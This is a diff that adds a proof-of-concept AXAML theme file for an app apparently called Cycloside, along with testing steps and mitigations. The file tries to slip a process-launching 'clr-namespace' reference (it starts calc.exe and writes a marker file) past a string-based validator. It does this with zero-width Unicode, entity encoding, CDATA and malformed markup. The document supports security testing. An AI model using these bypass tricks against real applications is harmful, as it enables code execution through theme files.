@@ -1,0 +1,129 @@
+<!-- 
+    PROOF OF CONCEPT: Parser Confusion Attack
+    DO NOT USE IN PRODUCTION
+    
+    This file demonstrates CYC-2026-019: Malformed AXAML bypassing string-based validation
+    
+    Strategy:
+    1. Contains valid-looking <Style></Style> tags (passes basic structure check)
+    2. Contains "clr-namespace:" in a comment (validator sees it, parser ignores it)
+    3. Contains actual clr-namespace in mangled/encoded form
+    4. Uses malformed structure to confuse parser
+-->
+
+<Styles xmlns="https://github.com/avaloniaui">
+    
+    <!-- 
+        DECOY: This comment contains the string "clr-namespace:" so that
+        IsAxamlContentSafe validator thinks the file is attempting CLR namespace
+        references and blocks it. But comments are ignored by the parser.
+    -->
+    
+    <Style Selector="Button">
+        <!-- Valid opening to pass structure checks -->
+        <Setter Property="Foreground" Value="Red" />
+    </Style>
+    
+    <!-- 
+        ATTACK VECTOR 1: Unicode tricks
+        The string below contains a zero-width non-joiner (U+200C) between "clr" and "-namespace"
+        String validator looking for literal "clr-namespace:" won't find it
+        But XML parser normalizes Unicode and WILL process it
+    -->
+    <Style xmlns:sys="clr‌-namespace:System.Diagnostics;assembly=System"
+           Selector="Window">
+        <Setter Property="Tag">
+            <sys:Process>
+                <sys:Process.StartInfo>
+                    <sys:ProcessStartInfo 
+                        FileName="calc.exe" 
+                        Arguments="/c echo PWNED > %TEMP%\cycloside_exploited.txt"
+                        CreateNoWindow="False"
+                        UseShellExecute="True"/>
+                </sys:Process.StartInfo>
+            </sys:Process>
+        </Setter>
+    </Style>
+    
+    <!-- 
+        ATTACK VECTOR 2: HTML entities
+        Same attack but using HTML/XML character entity references
+    -->
+    <Style xmlns:sys2="clr&#45;namespace:System.IO;assembly=System.Runtime"
+           Selector="Button">
+        <Setter Property="Tag">
+            <!-- File.WriteAllText via entity-encoded namespace -->
+        </Setter>
+    </Style>
+    
+    <!-- 
+        ATTACK VECTOR 3: CDATA sections
+        Some validators might not properly inspect CDATA content
+    -->
+    <Style>
+        <Style.Resources>
+            <![CDATA[
+                <!-- Embedding dangerous content inside CDATA -->
+                xmlns:attack="clr-namespace:System.Diagnostics;assembly=System"
+            ]]>
+        </Style.Resources>
+    </Style>
+    
+    <!-- 
+        ATTACK VECTOR 4: Malformed but recoverable
+        Parser might skip the garbage and continue processing
+    -->
+    <<<<<<<<<<Style
+        xmlns:proc="clr-namespace:System.Diagnostics;assembly=System"
+        >>>>>>>>>>>
+        Selector="TextBlock"
+        <><><><><>
+    >
+        <!-- Deeply nested garbage to confuse validator -->
+        <<<>>><<<>>><<<>>>
+        
+        <!-- But then valid-looking payload -->
+        <Setter Property="Tag" Value="Still processes?"/>
+    </Style>
+    
+</Styles>
+```
+
+**HOW TO TEST THIS FILE:**
+
+1. Save this file to `Cycloside/Themes/Test/MaliciousTest.axaml`
+2. Run Cycloside with a debugger attached
+3. Attempt to apply this theme
+4. Observe:
+   - Does string validator catch the zero-width character trick?
+   - Does string validator catch the HTML entity trick?
+   - Does CDATA confuse the validator?
+   - Does malformed structure crash the parser or get processed?
+   - Does calc.exe actually launch? (CRITICAL TO TEST)
+
+**EXPECTED RESULTS:**
+
+**If current validator is working:**
+- File is rejected during `IsAxamlContentSafe` check
+- No parsing ever occurs
+- No code execution
+
+**If validator has gaps:**
+- File passes `IsAxamlContentSafe` check
+- Avalonia's parser encounters the file
+- Depending on Avalonia's security model:
+  - Best case: Parser rejects malformed structure
+  - Worst case: Parser processes embedded `sys:Process` and launches calc.exe
+
+**MITIGATION IF THIS WORKS:**
+
+Validator must:
+1. Strip comments before checking for dangerous strings
+2. Resolve HTML entities before validation
+3. Normalize Unicode (NFC/NFD) before validation
+4. Reject CDATA sections entirely
+5. Validate XML structure with proper XML parser before content checks
+
+---
+
+**CRITICAL:** If any variant of this file causes calc.exe to launch, report immediately as CYC-2026-019 confirmation.
